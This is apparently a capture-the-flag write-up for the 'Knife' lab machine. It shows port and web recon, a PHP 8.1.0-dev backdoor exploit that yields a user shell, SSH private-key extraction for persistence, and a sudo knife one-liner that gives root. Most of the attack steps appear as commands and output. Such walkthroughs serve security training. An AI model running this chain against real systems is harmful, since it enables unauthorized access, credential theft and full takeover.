# Knife

## Machine Info

![Knife](./Knife.assets/Knife.png)

## Recon

### port

- nmap

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### path

- gobuster

```console
└─╼$ gobuster dir -u http://10.10.10.242/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 64 -x php --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.242/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5815]
/server-status        (Status: 403) [Size: 277]
Progress: 124568 / 124570 (100.00%)
===============================================================
Finished
===============================================================
```

### web

- whatweb

```console
└─╼$ whatweb http://10.10.10.242
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

## Foothold

### PHP 8.1.0-dev RCE

![image-20240131180955105](./Knife.assets/image-20240131180955105.png)

**Exploit**:

```console
└─╼$ python 49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ uname -a
Linux knife 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

**Post Exploit**: cp ssh priv key into local host and add james' pub key into his own authorized_keys

```console
$ cat /home/james/.ssh/id_rsa | head -n 5
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAu7RPlIkBcbCjzL3GKxJpJyiUuVrxLm3rejPGlaKdnIYqrrwYDHNN
QwndrU9+7PrRU6eiXEsdDb7JGxsnEBGJRdZ0qWRQVNLxsPpswXBAvT4dDLvxbdxxIS0jhB
33c5QFZsFjrSdc8iGaig+TLVg/A+5e2bSNYFV0XuDrZOuFrJPsS9gV+47q/FVfbzG0o4CV

$ cat /home/james/.ssh/id_rsa.pub >> /home/james/.ssh/authorized_keys

$ cat /home/james/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC7tE+UiQFxsKPMvcYrEmknKJS5WvEubet6M8aVop2chiquvBgMc01DCd2tT37s+tFTp6JcSx0NvskbGycQEYlF1nSpZFBU0vGw+mzBcEC9Ph0Mu/Ft3HEhLSOEHfdzlAVmwWOtJ1zyIZqKD5MtWD8D7l7ZtI1gVXRe4Otk64Wsk+xL2BX7jur8VV9vMbSjgJU3+b4jt7t4VGxv19aizJn2OL1H+0iOy2MNkKsqmPBq2gGikIJAA8iRJ+SdwLt4qsKx2VHJoZR2raGvRpMeCT/Dp2c5unWAuiylJ1jVp5auKq5QH02o1TVnBP2GRv8RJPrsxIjTE1QtrM3TCVmG56PKnB0ethZ5Brkv92Wd2eF/OD3Hlg5gs6WfR1lWNpZqPe6uFgrZS8z+mTKu/E4ND1VJvZ4BvxCqf3k4/J+yVqdatR4qshcLPcyyba7pYWX93dAptL8H9vVaL78mpL5VL+jFz8A5VQL+Itw74GClovzhFVzGCzH0SWloDxF+umYYsEImBnfVC2NKTryh4AF7PLOAQN7tXcspdmEeKOGl1uWCjOVj1zcgAhxn20YzGwFGDJ/PazeCfb1NPXL+jPj6LGWFIg13uvN1k6rwXtrmlWlYkgEYkOMvHTrBCTOsBHrYzow8NBuRV8hhbhntnIQNi3MT19dfTAhBdxaabAyiJ2/BEw== james@localhost
```

```console
└─╼$ ssh -i id_rsa james@$IP
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
...
james@knife:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:~$ uname -a
Linux knife 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation

### misconfiguration of sudo

- enum sudo

```console
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:~$ ls -l /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7  2021 /usr/bin/knife -> /opt/chef-workstation/bin/knife
james@knife:~$ ls -l /opt/chef-workstation/bin/knife
-rwxr-xr-x 1 root root 11697 Feb 15  2021 /opt/chef-workstation/bin/knife
```

- priv esca using knife
  - [Offical Document](https://docs.chef.io/workstation/knife/): knife is a command-line tool that provides an interface between a local chef-repo and the Chef Infra Server.
  - [knife | GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo)

```console
james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux knife 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## Exploit Chain

port scan -> web recon -> php version with rce -> james shell -> enum sudo -> sudo knife exploit -> root shell
